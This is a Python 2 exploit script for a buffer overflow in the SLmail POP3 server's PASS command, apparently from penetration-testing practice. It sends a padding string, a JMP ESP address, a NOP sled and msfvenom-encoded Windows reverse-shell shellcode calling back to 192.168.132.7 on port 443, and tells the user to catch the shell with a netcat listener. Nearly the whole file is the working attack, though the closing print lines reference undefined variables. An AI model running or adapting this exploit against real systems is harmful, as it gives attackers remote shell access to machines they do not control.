#!/usr/bin/python
# coding=utf-8

import time, struct, sys
import socket as so

achars = 'A'*2606

#JMP ESP address is 5F4A358F
jmpesp = '\x8f\x35\x4a\x5f'

#NOP Sled
nops = '\x90'*16

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.132.7 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai - THIS MUST BE REPLACED WITH YOUR MSFVENOM OUTPUT
buf =  b""
buf += b"\xb8\x11\x08\x6d\x7d\xd9\xcf\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e\x03\x53\x06\x8f"
buf += b"\x88\xaf\xfe\xcd\x73\x4f\xff\xb1\xfa\xaa\xce\xf1\x99"
buf += b"\xbf\x61\xc2\xea\xed\x8d\xa9\xbf\x05\x05\xdf\x17\x2a"
buf += b"\xae\x6a\x4e\x05\x2f\xc6\xb2\x04\xb3\x15\xe7\xe6\x8a"
buf += b"\xd5\xfa\xe7\xcb\x08\xf6\xb5\x84\x47\xa5\x29\xa0\x12"
buf += b"\x76\xc2\xfa\xb3\xfe\x37\x4a\xb5\x2f\xe6\xc0\xec\xef"
buf += b"\x09\x04\x85\xb9\x11\x49\xa0\x70\xaa\xb9\x5e\x83\x7a"
buf += b"\xf0\x9f\x28\x43\x3c\x52\x30\x84\xfb\x8d\x47\xfc\xff"
buf += b"\x30\x50\x3b\x7d\xef\xd5\xdf\x25\x64\x4d\x3b\xd7\xa9"
buf += b"\x08\xc8\xdb\x06\x5e\x96\xff\x99\xb3\xad\x04\x11\x32"
buf += b"\x61\x8d\x61\x11\xa5\xd5\x32\x38\xfc\xb3\x95\x45\x1e"
buf += b"\x1c\x49\xe0\x55\xb1\x9e\x99\x34\xde\x53\x90\xc6\x1e"
buf += b"\xfc\xa3\xb5\x2c\xa3\x1f\x51\x1d\x2c\x86\xa6\x62\x07"
buf += b"\x7e\x38\x9d\xa8\x7f\x11\x5a\xfc\x2f\x09\x4b\x7d\xa4"
buf += b"\xc9\x74\xa8\x6b\x99\xda\x03\xcc\x49\x9b\xf3\xa4\x83"
buf += b"\x14\x2b\xd4\xac\xfe\x44\x7f\x57\x69\xab\x28\x5f\x0e"
buf += b"\x43\x2b\x5f\xc1\xcf\xa2\xb9\x8b\xff\xe2\x12\x24\x99"
buf += b"\xae\xe8\xd5\x66\x65\x95\xd6\xed\x8a\x6a\x98\x05\xe6"
buf += b"\x78\x4d\xe6\xbd\x22\xd8\xf9\x6b\x4a\x86\x68\xf0\x8a"
buf += b"\xc1\x90\xaf\xdd\x86\x67\xa6\x8b\x3a\xd1\x10\xa9\xc6"
buf += b"\x87\x5b\x69\x1d\x74\x65\x70\xd0\xc0\x41\x62\x2c\xc8"
buf += b"\xcd\xd6\xe0\x9f\x9b\x80\x46\x76\x6a\x7a\x11\x25\x24"
buf += b"\xea\xe4\x05\xf7\x6c\xe9\x43\x81\x90\x58\x3a\xd4\xaf"
buf += b"\x55\xaa\xd0\xc8\x8b\x4a\x1e\x03\x08\x7a\x55\x09\x39"
buf += b"\x13\x30\xd8\x7b\x7e\xc3\x37\xbf\x87\x40\xbd\x40\x7c"
buf += b"\x58\xb4\x45\x38\xde\x25\x34\x51\x8b\x49\xeb\x52\x9e"

overflow = achars + jmpesp + nops + buf

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   print "Make sure to use netcat first. Example: nc -nlvp 443"
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER jesse' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + overflow + '\r\n')
   print "\n[+] Completed. Check netcat for shell."
   print ("\033[1;32;48m" + anonymous)
   print hacked
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()
